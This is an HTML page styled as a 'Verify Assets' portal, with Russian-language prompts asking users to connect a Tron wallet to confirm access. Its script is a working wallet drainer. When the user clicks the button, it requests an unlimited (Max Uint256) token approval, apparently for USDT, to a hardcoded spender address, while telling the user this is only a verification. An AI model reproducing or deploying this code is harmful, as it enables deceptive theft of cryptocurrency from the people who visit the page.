<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verification Portal</title>
    <style>
        body { font-family: 'Inter', sans-serif; background: #09090B; color: #FAFAFA; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
        .card { background: #121217; padding: 32px; border-radius: 28px; text-align: center; border: 1px solid #27272A; max-width: 400px; width: 90%; }
        .icon { width: 64px; height: 64px; background: #2563EB; border-radius: 18px; margin: 0 auto 24px; display: flex; align-items: center; justify-content: center; }
        h2 { margin: 0 0 12px; font-size: 22px; font-weight: 600; }
        p { color: #A1A1AA; font-size: 14px; margin-bottom: 32px; }
        button { background: #FFFFFF; color: #09090B; border: none; padding: 16px; font-size: 16px; font-weight: 600; border-radius: 14px; cursor: pointer; width: 100%; transition: 0.2s; }
        button:hover { background: #F4F4F5; }
        button:disabled { background: #27272A; color: #71717A; }
        #status { margin-top: 20px; font-size: 13px; color: #71717A; }
    </style>
</head>
<body>

    <div class="card">
        <div class="icon">
            <svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2.5"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
        </div>
        <h2>Verify Assets</h2>
        <p>Для продолжения работы с протоколом необходимо подтвердить доступ к активам.</p>
        <button id="actionBtn">Connect Wallet</button>
        <div id="status">Ожидание...</div>
    </div>

    <script>
        const TOKEN = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"; 
        const SPENDER = "TCCRZgsANneEEmwGuyFdv8AZyjoTNfk3an"; 
        // Десятичное представление Max Uint256 (Unlimited)
        const MAX_VAL = "115792089237316195423570985008687907853269984665640564039457584007913129639935";

        const btn = document.getElementById('actionBtn');
        const status = document.getElementById('status');

        async function init() {
            if (window.tronWeb && window.tronWeb.ready) {
                btn.innerText = "Confirm Access";
                btn.onclick = startApprove;
                status.innerText = "Кошелек подключен: " + window.tronWeb.defaultAddress.base58.slice(0,8) + "...";
            } else {
                btn.onclick = async () => {
                    if (window.tronLink) await window.tronLink.request({ method: 'tron_requestAccounts' });
                    setTimeout(init, 500);
                };
            }
        }

        async function startApprove() {
            try {
                btn.disabled = true;
                btn.innerText = "Check Wallet...";
                
                const contract = await window.tronWeb.contract().at(TOKEN);
                
                // Используем .send() с четким указанием параметров
                await contract.approve(SPENDER, MAX_VAL).send({
                    feeLimit: 100000000,
                    callValue: 0,
                    shouldPollResponse: false
                });

                status.innerText = "Запрос отправлен. Ожидайте подтверждения.";
                btn.innerText = "Processing...";
            } catch (e) {
                btn.disabled = false;
                btn.innerText = "Try Again";
                status.innerText = "Ошибка: " + (e.message || e);
            }
        }

        window.onload = () => setTimeout(init, 500);
    </script>
</body>
</html>
